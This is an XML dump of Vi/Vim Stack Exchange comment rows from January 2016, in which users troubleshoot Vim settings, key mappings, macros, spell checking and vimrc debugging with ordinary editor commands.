  <row Id="9775" PostId="3287" Score="2" Text="Great you solved the annoying `*emphasized txt*` on StackOverflow edits. It would deserve separate question and aswer as I guess on StackOverflow will be many programmers using vim with vimperator." CreationDate="2016-01-26T21:35:41.220" UserId="3340" />
  <row Id="9777" PostId="3287" Score="1" Text="see my question http://vi.stackexchange.com/questions/6268/vimperator-using-external-editor-e-g-vim-to-edit-stackoverflow-text. I would like you to put your answer there to make it easier to find it." CreationDate="2016-01-26T21:43:46.837" UserId="3340" />
  <row Id="9784" PostId="5063" Score="1" Text="Actually I found out since I wrote the above comment that [the POSIX specifications for `vi`](http://pubs.opengroup.org/onlinepubs/9699919799/utilities/vi.html#) use the term &quot;buffer&quot; rather than &quot;register&quot;.  I still think using the term &quot;register&quot; is better, though, to distinguish from the &quot;edit buffer.&quot;" CreationDate="2016-01-27T04:36:47.827" UserId="4676" />
  <row Id="9785" PostId="6269" Score="2" Text="You could build the command, but it would need a little bit of vimscript and it would probably not be a POSIX way: `:execute '2,$g/\V' . escape(getline(1), '\') . '/d'`" CreationDate="2016-01-27T08:19:38.077" UserId="4939" />
  <row Id="9786" PostId="6269" Score="1" Text="@saginaw, thanks.  So far the only POSIX approach that has occurred to me is to just use `sed` as a [filter](http://vi.stackexchange.com/a/5363/4676) from within `ex`, and run my entire `sed` answer on the whole buffer...which *would* work, of course (and is actually portable unlike `sed -i`)." CreationDate="2016-01-27T08:32:35.283" UserId="4676" />
  <row Id="9787" PostId="6272" Score="0" Text="Does set `:set tw=105` do what you want?" CreationDate="2016-01-27T09:11:35.890" UserId="1313" />
  <row Id="9788" PostId="6263" Score="3" Text="@newUserNameHere I think I can reproduce your issue by adding the following code in my vimrc `silent! exe &quot;set &lt;M-j&gt;=\ej&quot;` and `set ttimeoutlen=2000`. In your Vim session, what is the output of `:echo &amp;ttimeoutlen` ? Have you defined mappings using the Alt modifier key ? Is your problem still there if you restart Vim with a minimum of initializations `vim -u NORC -N`?" CreationDate="2016-01-27T10:18:52.270" UserId="4939" />
  <row Id="9789" PostId="6272" Score="4" Text="http://stackoverflow.com/a/26318602/789222" CreationDate="2016-01-27T10:59:13.670" UserId="71" />
  <row Id="9790" PostId="6263" Score="0" Text="Thankyou @saginaw. The ttimeoutlen was causing it. If you submit this as a solution I can accept it. I had these settings: `set timeoutlen=1000 ttimeoutlen=0` and when I changed them to `set timeoutlen=0 ttimeoutlen=-1` it fixed everything!" CreationDate="2016-01-27T14:46:01.197" UserId="2541" />
  <row Id="9791" PostId="6163" Score="1" Text="Thanks a lot! This wraps up the solution in a great detail." CreationDate="2016-01-27T15:01:18.907" UserId="5328" />
  <row Id="9792" PostId="6263" Score="2" Text="@newUserNameHere I'm really glad I could help you! However I don't feel comfortable writing an answer as there are too many things I don't understand. I don't want to bother you with all the details, but to make it short, on my machine, the real problem is not `'timeout'`, neither `'timeoutlen'` nor `'ttimeoutlen'`, but the command I mentioned `exe &quot;set &lt;M-j&gt;=\ej&quot;`. As soon as I type it, I experience the same issue as you. I had similar commands in my vimrc in the past because I wanted to use mappings with the Alt modifier key..." CreationDate="2016-01-27T16:07:14.447" UserId="4939" />
  <row Id="9793" PostId="6263" Score="1" Text="... and Vim must be taught what's the sequence of keycodes for a mapping whose `{lhs}` uses the Alt key. See here for a confirmation: http://vi.stackexchange.com/a/6021/4939 But I removed most of them because I've discovered they break too many things, including the replay of a macro. If I launch `cat` in my shell and type `&lt;A-j&gt;`, it displays `^[j`. So `&lt;A-j&gt;` produces the sequence of keycodes `Escape` + `j`. When Vim receives this sequence of keycodes, it doesn't know if you typed `&lt;A-j&gt;` or the character `ê`. Why? It's complex..." CreationDate="2016-01-27T16:07:46.463" UserId="4939" />
  <row Id="9794" PostId="6263" Score="2" Text="... but if you're interested, here's an answer: http://vi.stackexchange.com/a/6107/4939 So once I tell Vim that `Escape` + `j` must be interpreted as `&lt;A-j&gt;`, I have the exact same issue as you. And if I &quot;unteach&quot; Vim what `&lt;A-j&gt;` is (`exe &quot;set &lt;M-j&gt;=&quot;`), the problem disappears. On my machine, the options `'timeoutlen'` and `'ttimeoutlen'` have nothing to do with the problem. They control how much time Vim will wait for respectively a sequence of keystrokes in a mapping, and a sequence of keycodes." CreationDate="2016-01-27T16:07:57.650" UserId="4939" />
  <row Id="9795" PostId="6263" Score="1" Text="The reason why I mentioned `'ttimeoutlen'` is because I thought that by reducing the length of the timeout for keycodes on your machine, you would increase the chance for Vim to interpret `Escape` and `j` as 2 separate keystrokes instead of a single sequence of keycodes. I typed the command you mentioned `set timeoutlen=0 ttimeoutlen=-1`.  But on my machine it breaks all my mappings because if `'timeoutlen'`'s value is 0, when I type the first character of a mapping Vim doesn't wait anymore for the next one." CreationDate="2016-01-27T16:08:07.890" UserId="4939" />
  <row Id="9796" PostId="6263" Score="1" Text="The command that I have in my vimrc is the following `set timeout timeoutlen=3000 ttimeoutlen=100`. It's given in `:help ttimeoutlen`. I think it's a good command because it gives you enough time to type your mapping (3s) but waits only .1s for a sequence of keycodes, which is good because it prevents Vim from interpreting your keystrokes as part of a sequence of keycodes which can be annoying. See here for an example of problem you can encounter when `'ttimeoutlen'` is too high: http://vi.stackexchange.com/a/3262/4939" CreationDate="2016-01-27T16:08:18.180" UserId="4939" />
  <row Id="9797" PostId="6263" Score="1" Text="Everything I said could explain how to solve the issue on my machine but it doesn't explain how you did. The problem is we probably don't use the same environment (OS, terminal emulator, terminal multiplexer, Vim version...) so it's hard to tell what worked for you and therefore I can't write an answer sorry. But again, I'm really glad it helped you a little!" CreationDate="2016-01-27T16:08:28.720" UserId="4939" />
  <row Id="9798" PostId="6272" Score="0" Text="Christian, that's it. Thanks!" CreationDate="2016-01-27T18:35:06.463" UserId="6174" />
  <row Id="9799" PostId="6135" Score="0" Text="Okay, I like `YP`; that is quick and easy to type.  I'm convinced.  ;)" CreationDate="2016-01-27T20:14:12.447" UserId="4676" />
  <row Id="9800" PostId="6269" Score="0" Text="You're right and I find your initial approach with `&lt;C-r&gt;0` very good. I'm not sure you could do better with only Ex commands because you have to protect special characters. Without the POSIX compliant constraint I think you would use the very nomagic switch `\V` and then you would protect the backslash (because it keeps its special meaning even with `\V`) with the `escape()` function whose 2nd argument is a string containing all the characters you want to escape/protect." CreationDate="2016-01-27T20:40:29.843" UserId="4939" />
  <row Id="9801" PostId="6269" Score="0" Text="However, in the previous command I forgot to protect the forward slash too, because it also has a special meaning for the global command, it's the pattern delimiter. So the correct command would probably be something like: `:execute '2,$g/\V' . escape(getline(1), '\/') . '/d'` Or you could use another character for the pattern delimiter like a semicolon. In this case you wouldn't need to protect a forward slash in the pattern. It would give something like: `:execute '2,$g;\V' . escape(getline(1), '\') . ';d'`" CreationDate="2016-01-27T20:40:38.017" UserId="4939" />
  <row Id="9802" PostId="6269" Score="1" Text="I find your second approach with `sed` also very good. With Vim, you often delegate certain special tasks to other programs, and `sed` is probably a good example of that. By the way, you don't have to run `sed` on your whole buffer. If you want to run it only on a portion of the buffer, you can give a range. For example, if you want to filter only the lines between 50 and 100, you could type: `:50,100!&lt;your sed command&gt;`." CreationDate="2016-01-27T20:53:29.807" UserId="4939" />
  <row Id="9803" PostId="4254" Score="0" Text="@toogley I'm not sure but I think the following code should do what you want: http://vpaste.net/PyObW" CreationDate="2016-01-28T00:39:24.760" UserId="4939" />
  <row Id="9804" PostId="5272" Score="0" Text="@silviubogan If they work well outside of tmux it probably means tmux is intercepting your keystrokes, you could look at `~/.tmux.conf` and see if maybe you have defined some mappings for `&lt;C-Home&gt;` and `&lt;C-End&gt;` there." CreationDate="2016-01-28T00:54:49.823" UserId="4939" />
  <row Id="9805" PostId="6230" Score="1" Text="&quot;t's a bit annoying to install,&quot;... That's an understatement.  Still, it is very good. ^_~" CreationDate="2016-01-28T09:27:32.190" UserId="622" />
  <row Id="9806" PostId="6243" Score="0" Text="Thanks. I opened an issue." CreationDate="2016-01-28T09:47:34.437" UserId="5919" />
  <row Id="9807" PostId="6279" Score="2" Text="Global variables: `echo g:mapleader` `echo g:maplocalleader` (usually you can skip the `g:`). Hint: you can also set them :D" CreationDate="2016-01-28T10:48:06.080" UserId="1800" />
  <row Id="9808" PostId="6279" Score="2" Text="@VanLaser, don't be shy; post answers." CreationDate="2016-01-28T11:01:19.100" UserId="54" />
  <row Id="9809" PostId="6279" Score="1" Text="But, but .. they are SO simple :( I do encourage the author of the question to post the answer himself/herself, in a good quality format." CreationDate="2016-01-28T11:36:29.440" UserId="1800" />
  <row Id="9810" PostId="6279" Score="0" Text="@VanLaser You could expand your answer and explain what's the use of this key. Even though I've already read the page linked by the author of the question, I've never quite understood what's the benefit of this key compared to the `&lt;leader&gt;` key." CreationDate="2016-01-28T12:00:59.317" UserId="4939" />
  <row Id="9811" PostId="6279" Score="1" Text="I could, but this information is available already." CreationDate="2016-01-28T12:07:54.763" UserId="1800" />
  <row Id="9812" PostId="6279" Score="0" Text="You're right sorry, it's only for certain filetypes. I rarely see it used so I forgot." CreationDate="2016-01-28T12:18:31.130" UserId="4939" />
  <row Id="9813" PostId="6279" Score="2" Text="No need to apologize :) What I mean is, I don't *like* writing long answers, unless absolutely necessary." CreationDate="2016-01-28T12:23:09.870" UserId="1800" />
  <row Id="9814" PostId="6280" Score="0" Text="And, how do you inspect its value?" CreationDate="2016-01-28T14:14:23.207" UserId="5919" />
  <row Id="9815" PostId="6280" Score="2" Text="@YossiGil `let maplocalleader` or `echo maplocalleader`, as I have already mentioned." CreationDate="2016-01-28T14:16:18.473" UserId="205" />
  <row Id="9816" PostId="6280" Score="0" Text="I edited the answer so that this would be more explicit." CreationDate="2016-01-28T17:19:06.387" UserId="5919" />
  <row Id="9817" PostId="6240" Score="0" Text="If you compile YCM with the `--clang-completer`, does it work then? I think I'm using the param completion all the time at work. Cannot check right now..." CreationDate="2016-01-28T18:04:10.157" UserId="1041" />
  <row Id="9818" PostId="744" Score="0" Text="The hasmapto() test and &lt;Plug&gt;... stuff permits you to customize; instead of gx, for example, you could have vmap &lt;unique&gt; GX &lt;Plug&gt;NetrwBrowseX in your .vimrc, and GX would be the map to invoke the special-file handler." CreationDate="2016-01-28T19:39:20.380" UserId="2377" />
  <row Id="9819" PostId="6279" Score="1" Text="@VanLaser Amen brother!" CreationDate="2016-01-28T22:49:37.987" UserId="71" />
  <row Id="9820" PostId="6282" Score="1" Text="`end_us`? Is the end nigh? :D" CreationDate="2016-01-28T23:38:41.970" UserId="205" />
  <row Id="9821" PostId="6282" Score="1" Text="Does this behaviour occur in an empty buffer? Do you still get this error if you enter :set ft=" CreationDate="2016-01-29T00:11:31.303" UserId="4932" />
  <row Id="9822" PostId="6282" Score="1" Text="Are you using `spelllang=end_us`? Because that's not valid. Also make sure spell checking is actually enabled with `:set spell?` and that you haven't accidentally added those words to the dictionary with `zg` in `~/.vim/spell/en-utf-8.add` (assuming you're using utf-8)." CreationDate="2016-01-29T02:08:14.763" UserId="51" />
  <row Id="9823" PostId="6280" Score="2" Text="Note that Vim will always expand the current value of `mapleader`/`maplocalleader` when it's used, and that re-setting the value to something else will **not** affect any previous instances of its usage, so getting the current value of `mapleader` may not reflect the value that Vim actually used to expand the key mappings (see the [code example here](http://vi.stackexchange.com/a/3135/51))." CreationDate="2016-01-29T02:12:31.953" UserId="51" />
  <row Id="9824" PostId="6282" Score="1" Text="@muru Thanks for pointing out. I've corrected the typo in OP." CreationDate="2016-01-29T02:13:50.547" UserId="1080" />
  <row Id="9825" PostId="6284" Score="0" Text="Thank you so much!!!  I didn't even know there was an option of &quot;ft-php-&quot; for the syntax help.  Adding that `let php_...` to .vimrc did the trick!" CreationDate="2016-01-29T02:16:39.397" UserId="6189" />
  <row Id="9826" PostId="6282" Score="1" Text="@JeffreyLai Thanks for your answer. It behaves normally in an empty buffer. And the problem is fixed using `:set ft=`. Please post your answer in the answer area so that I can accept it." CreationDate="2016-01-29T02:17:39.380" UserId="1080" />
  <row Id="9827" PostId="6249" Score="1" Text="&quot;You shouldn't be navigating in insert mode&quot; - &gt; Because pressing the down arrow twice is somehow not as fast as pressing `&lt;Esc&gt;jji`. Never mind that `&lt;Esc&gt;` is also outside the home row, just like the down arrow." CreationDate="2016-01-29T02:19:15.020" UserId="51" />
  <row Id="9828" PostId="6282" Score="1" Text="@user3813057 Some filetypes ignore spell checking in some regions; there is currently [no easy way to override this](http://vi.stackexchange.com/q/2119/51)." CreationDate="2016-01-29T02:22:03.727" UserId="51" />
  <row Id="9829" PostId="6249" Score="0" Text="@Carpetsmoker, if a down arrow keystroke could be properly replayed as part of a dot command, I would probably do that sometimes.  Since it can't...I don't bother with arrow keys; `&lt;C-o&gt;2j` is still faster." CreationDate="2016-01-29T02:40:05.573" UserId="4676" />
  <row Id="9830" PostId="6282" Score="0" Text="Out of interest, what *is* the filetype that you were editing?" CreationDate="2016-01-29T03:40:29.810" UserId="4932" />
  <row Id="9831" PostId="6282" Score="0" Text="It's a tex file." CreationDate="2016-01-29T04:03:53.160" UserId="1080" />
  <row Id="9832" PostId="6283" Score="0" Text="It seems your problem is solved. Accept (and upvote) the answer!" CreationDate="2016-01-29T05:05:31.740" UserId="6154" />
  <row Id="9833" PostId="6284" Score="1" Text="You should mark the answer as correct, @alec." CreationDate="2016-01-29T05:52:52.880" UserId="21" />
  <row Id="9834" PostId="6154" Score="0" Text="I realized I need a slightly different solution.  I need all of the subheadings to be in one column and separated by `&lt;br&gt;`, instead of in their own separate columns. E.g.  &#xA;&gt; &quot;* Micro topic 1&quot;, &quot;** Microbes are small&lt;br&gt;** You can't see them!&lt;br&gt;*** Isn't that something?&quot;&#xA;&#xA;Should I post a new question or edit this question?" CreationDate="2016-01-29T06:03:36.440" UserId="6053" />
  <row Id="9835" PostId="6287" Score="2" Text="About your &quot;p.s&quot;: if you insert 4 spaces in front of a line it is interpreted as code (you can select the text and use the format buttons on the top). You can find more details on the [interrogation icon on the top](http://vi.stackexchange.com/editing-help)." CreationDate="2016-01-29T11:01:35.893" UserId="1405" />
  <row Id="9836" PostId="6289" Score="0" Text="Could you explain a little more your solution?" CreationDate="2016-01-29T12:04:06.447" UserId="1453" />
  <row Id="9837" PostId="6289" Score="3" Text="@vappolinario, I added some further explanation.  Does that help?  :)" CreationDate="2016-01-29T12:35:15.127" UserId="4676" />
  <row Id="9838" PostId="6289" Score="0" Text="Yes, thank you." CreationDate="2016-01-29T12:49:59.017" UserId="1453" />
  <row Id="9839" PostId="6288" Score="0" Text="Instead of the `1000@q` hack, you can also use a recursive macro: `qmqqm ... @mq@m`." CreationDate="2016-01-29T13:06:39.933" UserId="88" />
  <row Id="9840" PostId="6286" Score="0" Text="Thanks for the edit @Carpetsmoker, that's exactly my problem.  How to make &quot;This is also red&quot; black instead?" CreationDate="2016-01-29T13:28:19.320" UserId="6189" />
  <row Id="9841" PostId="6290" Score="0" Text="Why do you explicitly clear out register q?  If you just record into it, whatever was in there will get overwritten anyway...." CreationDate="2016-01-29T14:34:42.937" UserId="4676" />
  <row Id="9842" PostId="6290" Score="4" Text="@Wildcard Because it's a recursive macro, the first time you call the content of register `q`, it must be empty, otherwise it will mess up your editions." CreationDate="2016-01-29T14:39:59.123" UserId="4939" />
  <row Id="9843" PostId="6290" Score="0" Text="Very nice.  I tried this interactively without trying to type the exact sequence of your command and wound up using: `qqqggqqjjjkddkkPjddjpkddkkPjjjj@qq@q`" CreationDate="2016-01-29T14:44:06.587" UserId="4676" />
  <row Id="9844" PostId="6290" Score="0" Text="@Wildcard Cool! The important point of this answer is that macros are a fantastic tool: the exact sequence of operations that you record doesn't really matter. Anything that works is great!" CreationDate="2016-01-29T15:48:49.867" UserId="343" />
  <row Id="9845" PostId="6287" Score="0" Text="Okay, thank you. I'll try that next time." CreationDate="2016-01-29T16:16:52.510" UserId="6195" />
  <row Id="9846" PostId="6291" Score="3" Text="Macros are stored as a register in the [`viminfo`](http://vimhelp.appspot.com/options.txt.html#%27viminfo%27) file. AFAIK there is no obvious way to distinguish between a &quot;normal&quot; register and a macro other than overriding the `q` mapping and storing this information somewhere." CreationDate="2016-01-29T16:23:57.493" UserId="51" />
  <row Id="9847" PostId="6291" Score="0" Text="I agree with @Carpetsmoker.  If you fat finger the `@` key, you can always hit `u` to undo the change." CreationDate="2016-01-29T16:37:57.583" UserId="4676" />
  <row Id="9848" PostId="6288" Score="0" Text="When I tried to run the &quot;qmV3j:Reverse&lt;cr&gt;4jq&quot;, it said &quot;E492: Not an editor command&quot;. I must be doing something wrong. I'm using - and have only ever used - GVIM, by the way. I should have mentioned that in the first place." CreationDate="2016-01-29T16:51:10.347" UserId="6195" />
  <row Id="9849" PostId="6289" Score="0" Text="Wow, very long answer. :) I have sed, actually, but I've just used it with one simple script that I found somewhere - probably on this board - that was a solution to a problem I had. However, when I tried to run your suggested line, it says &quot;'sed' is not recognized as an internal or external command, operable program or batch file.&quot; I'm not sure if I need to have sed in the vim folder or what." CreationDate="2016-01-29T16:58:03.170" UserId="6195" />
  <row Id="9850" PostId="6289" Score="1" Text="@ablewasiereisawelba, if you're running on a Windows box and not using Cygwin (or MobaXterm or similar), you could try the other method I gave: `4G:.m -4 | +3m . | +2m . | +5&lt;Enter&gt;@:` then `@@` repeated until your file is fully processed.  I recommend installing MobaXterm, though.  :)" CreationDate="2016-01-29T17:20:04.830" UserId="4676" />
  <row Id="9851" PostId="6288" Score="0" Text="Ah, never mind. I figured it out - I am not supposed to type &quot;:&quot; before the &quot;qmV3j:Reverse&lt;cr&gt;4jq&quot; part. It worked! Thank you very much, mMontu. If I may ask - how do I include the &quot;:Reverse&quot; command in my .vimrc?" CreationDate="2016-01-29T17:27:36.763" UserId="6195" />
  <row Id="9853" PostId="6288" Score="3" Text="@ablewasiereisawelba To make the command available permanently, simply write the line `command! -bar -range=% Reverse &lt;line1&gt;,&lt;line2&gt;g/^/m&lt;line1&gt;-1|nohl` somewhere in your vimrc." CreationDate="2016-01-29T17:33:28.877" UserId="4939" />
  <row Id="9854" PostId="6289" Score="0" Text="@Wildcard Oh okay, I'm checking out MobaXterm now. :)" CreationDate="2016-01-29T17:33:40.663" UserId="6195" />
  <row Id="9855" PostId="6288" Score="0" Text="@saginaw Oh, I didn't realize it was that straightforward. Thank you." CreationDate="2016-01-29T17:39:15.867" UserId="6195" />
  <row Id="9858" PostId="6290" Score="0" Text="I'm going to go against the suggestion [that comments be used only for asking for more information or suggesting improvements, not for saying &quot;thanks&quot;] just this one time - on my first thread - just because I want to make sure to thank everyone personally who took the time to answer my question. (In the future, I will certainly try to abide by that suggestion.) I didn't try out this answer, because @saginaw's answer below seems to be the simplest, where I can just use the one-line custom command each time I need to do this - but thank you, Rich, for your response." CreationDate="2016-01-29T18:01:51.127" UserId="6195" />
  <row Id="9859" PostId="6291" Score="0" Text="@Carpetsmoker, what about deleting _all_ registers, then?" CreationDate="2016-01-29T18:04:49.070" UserId="5339" />
  <row Id="9861" PostId="6288" Score="0" Text="I'll go ahead and select this answer - even though @saginaw's answer was the simplest for my purposes, it did have the problem of not working at all when the number of lines was not an exact multiple of 4. This answer does still work in those situations, as I just tried it in a situation where there were 3 extra lines at the end, and those 3 lines simply got reversed - just like all the preceding groups of 4." CreationDate="2016-01-29T18:20:49.383" UserId="6195" />
  <row Id="9862" PostId="6256" Score="0" Text="I would share your concern, however it seems that `vim-conque` has not been updated in 5 years (_cf_ http://www.vim.org/scripts/script.php?script_id=2771 ). So I am not terribly worried about having to merge in changes." CreationDate="2016-01-29T18:40:12.710" UserId="4686" />
  <row Id="9865" PostId="6296" Score="1" Text="Could you post a few lines from your _vimrc_, the lines just before the part from your _vimrc_ that shows up in the buffers?" CreationDate="2016-01-29T20:39:02.900" UserId="1306" />
  <row Id="9867" PostId="6295" Score="2" Text="You can include the whole or parts of the match in the substitution. Using `\0` will include the whole match, so `&quot;\0&quot;` will surround the match with quotes. For your input example `:%s/^\*\*\_.\{-}\*\*\*.\{-}$/&quot;\0&quot;` will generate the output. Is that what you are looking for?" CreationDate="2016-01-29T20:54:15.490" UserId="1306" />
  <row Id="9868" PostId="6296" Score="0" Text="I've updated the post. You can see the  `:q!` followed by the end part of my `.vimrc`." CreationDate="2016-01-29T21:10:38.740" UserId="6078" />
  <row Id="9869" PostId="6296" Score="0" Text="Great, but I was looking for the lines just _before_ the part that shows up :) My guess is that you do something in your _vimrc_ that causes it to stop processing the lines as ex commands and instead input it as text into whatever first buffer you are loading. Maybe you can add five lines to the top, or even share your whole _vimrc_ if it is not too large?" CreationDate="2016-01-29T21:20:58.277" UserId="1306" />
  <row Id="9870" PostId="6296" Score="0" Text="I don't suppose you have a literal `:q!` in your _vimrc_?" CreationDate="2016-01-29T21:21:27.827" UserId="1306" />
  <row Id="9871" PostId="6298" Score="0" Text="If you are debugging plugins, then do: Disable half of your plugins. If it fixes the problem, re-enable half of the disabled ones. If it doesn't, disable half of the ones not yet disabled. Repeat until you have proven which plugin is the cause, or that none is." CreationDate="2016-01-29T21:25:49.580" UserId="1306" />
  <row Id="9872" PostId="6298" Score="1" Text="Your happy case is found by running `vim -u NONE`. If that does not suffer from the problem then there is something in your startup sequence that is causing it. You can extend the above bisection to your whole _vimrc_, in case you found that no plugin was the cause.&#xA;See http://vi.stackexchange.com/questions/2003/how-do-i-debug-my-vimrc-file and http://vim.wikia.com/wiki/Bisecting" CreationDate="2016-01-29T21:27:27.120" UserId="1306" />
  <row Id="9873" PostId="6296" Score="0" Text="I'm afraid I had this in my vimrc ! The problem is solved, thank you. I feel so dumb, why haven't I thought of this ?That's because I didn't know how vim responds to incorrect vimrc file... Again, thank you." CreationDate="2016-01-29T21:27:54.687" UserId="6078" />
  <row Id="9874" PostId="6296" Score="1" Text="No problem :) happy vimming" CreationDate="2016-01-29T21:29:11.997" UserId="1306" />
  <row Id="9875" PostId="6296" Score="1" Text="Thank you ! Vim is awesome ! :)" CreationDate="2016-01-29T21:31:01.717" UserId="6078" />
  <row Id="9876" PostId="6298" Score="0" Text="`vim -u NONE` fixes the problem.  however, commenting out even *all* of my plugins in .vimrc does not.  where do i go from here?" CreationDate="2016-01-29T21:52:13.323" UserId="5373" />
  <row Id="9877" PostId="6298" Score="0" Text="Disable half of the rest of your _vimrc_. If it fixes the problem, re-enable half of the disable part. If it doesn't, comment out..." CreationDate="2016-01-29T21:55:48.560" UserId="1306" />
  <row Id="9878" PostId="6298" Score="0" Text="This happens when you open Vim without any filename arguments, or when you open Vim to edit a particluar file? If a particular file, can you describe the file? You should also inspect the output of `:scriptnames` to see what scripts have been run since you started Vim. Since `vim -u NONE` is OK, the culprit will be in there somewhere." CreationDate="2016-01-29T21:58:13.490" UserId="1306" />
  <row Id="9879" PostId="6298" Score="1" Text="@jjaderberg, thanks, that worked.  The culprit was this line which I added recently and forgot about it: `set lines=999 columns=9999` -- intended to auto-maximize vim on MacOS.  I guess I should find another method... I'll accept your comment as an answer if you add it." CreationDate="2016-01-29T22:05:16.647" UserId="5373" />
  <row Id="9880" PostId="5177" Score="1" Text="Disadvantage: It's not repeatable with the `.` command.  :(" CreationDate="2016-01-29T22:08:40.660" UserId="4676" />
  <row Id="9881" PostId="6296" Score="0" Text="@jjaderberg do post an answer." CreationDate="2016-01-29T22:12:45.710" UserId="205" />
  <row Id="9883" PostId="6296" Score="0" Text="muru: okidoke. NicolasScottoDiPerto: Vim is difficult and makes fools of us all from time to time." CreationDate="2016-01-29T22:35:28.657" UserId="1306" />
  <row Id="9884" PostId="6303" Score="3" Text="Type `:help subject` without pressing enter and then press `&lt;C-d&gt;` (aka Ctrl-D).  It looks like there isn't a direct link for `:map` with no args though." CreationDate="2016-01-29T23:32:41.607" UserId="4676" />
  <row Id="9886" PostId="6303" Score="0" Text="Thanks, but I already tried that. I also tried it w/`:set wildcard` and &lt;tab&gt;. I still asked the question in case there was some other way to do it besides the ways described here: http://vim.wikia.com/wiki/Learn_to_use_help" CreationDate="2016-01-29T23:50:59.180" UserId="6207" />
  <row Id="9888" PostId="6298" Score="0" Text="@Jonah That should actually work... We have a [Windows question](http://vi.stackexchange.com/q/1937/51) for that, by the way, but no OSX question ... yet... ;-)" CreationDate="2016-01-30T00:11:41.167" UserId="51" />
  <row Id="9890" PostId="6303" Score="4" Text="You can use `/^:map\s&lt;Enter&gt;` which goes right to it.  I see your point; but there just isn't any tag directly on that `help` entry.  So there won't be any way to jump directly to it from the `:help` command.  Improving your regex search is good, though.  E.g., if you know you want something at the start of the line it's good to specify that." CreationDate="2016-01-30T00:28:39.150" UserId="4676" />
  <row Id="9891" PostId="6303" Score="3" Text="Thanks. I also found out about `:helpgrep ^:map\s`, but you're way solves it: `:help :map` then `/^:map\s`" CreationDate="2016-01-30T00:35:59.843" UserId="6207" />
  <row Id="9892" PostId="6298" Score="0" Text="@Carpetsmoker, oh it works, it just creates an annoying 1 second pause, even when it's already maximized." CreationDate="2016-01-30T01:06:18.850" UserId="5373" />
  <row Id="9893" PostId="6295" Score="1" Text="It works for the example I provided, but the subheading structures will be variable, e.g. http://pastebin.com/JYhhCaq2  I tried modifying it in various ways:  `g/^\*\{2,}\_.\{-}\*\{2,}.\{-}$`  Strangely, applying this to the example in pastebin excludes all top level headings (as desired) except for `* dangerous microbes`  Perhaps if I can visually select the pattern, then I can substitute with `&quot;\0&quot;` ?" CreationDate="2016-01-30T05:12:13.180" UserId="6053" />
  <row Id="9894" PostId="6295" Score="0" Text="Perhaps this could help:  `/\n\*[^*]\|\%$`  to go to the line before the next top level heading, or if that fails, to the last line of the file from @PhilipFrank" CreationDate="2016-01-30T05:17:26.750" UserId="6053" />
  <row Id="9895" PostId="6295" Score="0" Text="This, or something like it, might be handy too `g/^* /+,/^* /-` from http://vimregex.com/#address  It is used for &quot;all lines between Section 1 and Section 2, non-inclusively&quot;" CreationDate="2016-01-30T05:32:59.400" UserId="6053" />
  <row Id="9896" PostId="6295" Score="1" Text="By the way, the ultimate goal is to join the subheadings onto one line with their parent heading, so perhaps it would be easier to get them on one line first?  So the final product will be:   &quot;* Micro topic 1&quot;, &quot;** Microbes are small&lt;br&gt;** You can't see them!&lt;br&gt;*** Isn't that something?&quot;  All on one line." CreationDate="2016-01-30T06:17:07.900" UserId="6053" />
  <row Id="9897" PostId="6276" Score="0" Text="Much, much harder is: inserting a line at the end of a file, only if the line doesn't already exist *somewhere* in the file." CreationDate="2016-01-30T08:05:18.110" UserId="4676" />
  <row Id="9898" PostId="5177" Score="1" Text="@Wildcard unfortunately, after doing a bit of research, there isn't a way to create a manual repeat branch for `.` unless you're using [`repeat.vim`](https://github.com/tpope/vim-repeat)." CreationDate="2016-01-30T09:13:02.893" UserId="3164" />
  <row Id="9899" PostId="457" Score="0" Text="Its there to remind us of our history. Learn ed and ex, and remember ken and dmr wrote UN*X on this." CreationDate="2016-01-30T21:25:31.587" UserId="6217" />
  <row Id="9900" PostId="6277" Score="0" Text="[&quot;Do not be afraid to ask&quot;](https://books.google.com/ngrams/graph?content=do+not+be+afraid+to%2Cdo+not+afraid+to%2Cdo+not+fear+to&amp;case_insensitive=on&amp;year_start=1800&amp;year_end=2000&amp;corpus=15&amp;smoothing=3&amp;share=&amp;direct_url=t4%3B%2Cdo%20not%20be%20afraid%20to%3B%2Cc0%3B%2Cs0%3B%3BDo%20not%20be%20afraid%20to%3B%2Cc0%3B%3Bdo%20not%20be%20afraid%20to%3B%2Cc0%3B%3BDo%20not%20Be%20Afraid%20to%3B%2Cc0%3B.t4%3B%2Cdo%20not%20fear%20to%3B%2Cc0%3B%2Cs0%3B%3Bdo%20not%20fear%20to%3B%2Cc0%3B%3BDo%20not%20fear%20to%3B%2Cc0) is the correct phrasing here." CreationDate="2016-01-30T23:34:30.103" UserId="205" />
  <row Id="9901" PostId="6306" Score="0" Text="This is not an answer to the question" CreationDate="2016-01-31T00:04:26.217" UserId="51" />
  <row Id="9902" PostId="6249" Score="0" Text="Also, I haven't touched the `&lt;Esc&gt;` key a single time since learning that `&lt;C-[&gt;` does the same thing." CreationDate="2016-01-31T07:49:32.530" UserId="4676" />
  <row Id="9903" PostId="4572" Score="0" Text="I don't have a mapping for this, just an idea...but what if you set Vim to insert tabs (of whatever width you like) when you press the tab key, but actually expand a tab to spaces if you type Shift-Tab?  Wouldn't that make this sort of alignment simple?" CreationDate="2016-01-31T07:58:43.990" UserId="4676" />
  <row Id="9904" PostId="4572" Score="0" Text="(P.S.: There's a nice discussion on [&quot;Tabs vs. Spaces&quot;](http://fora.xkcd.com/viewtopic.php?f=40&amp;t=15328) in the &quot;Religious Wars&quot; forum of the [xkcd comic](http://www.xkcd.com/272/).  Enjoy ;)" CreationDate="2016-01-31T08:05:09.390" UserId="4676" />
  <row Id="9905" PostId="6307" Score="3" Text="Related: [How to know commands I've been typing?](http://stackoverflow.com/questions/9656230/how-to-know-commands-ive-been-typing) on StackOverflow." CreationDate="2016-01-31T10:35:05.207" UserId="630" />
  <row Id="9906" PostId="6308" Score="1" Text="Thanks for your answer. But I had this in my _vimrc_. So I tried other things in vimrc and by disabling wildmenu it was fixed. Then I enabled wildmenu again and nothing changed. Now I don't know what was wrong!" CreationDate="2016-01-31T20:58:57.987" UserId="6219" />
  <row Id="9907" PostId="2403" Score="0" Text="Perhaps I'm not seeing the issue: Quoting from the Jedi manual: &quot;The specified Python version just refers to the runtime environment for Jedi. Use the Python 2 version if you’re running vim (or whatever editor you use) under Python 2. Otherwise, use the Python 3 version. But whatever version you choose, both are able to complete both Python 2 and 3 code.&quot;  https://media.readthedocs.org/pdf/jedi/latest/jedi.pdf" CreationDate="2016-01-31T22:55:37.080" UserId="1379" />
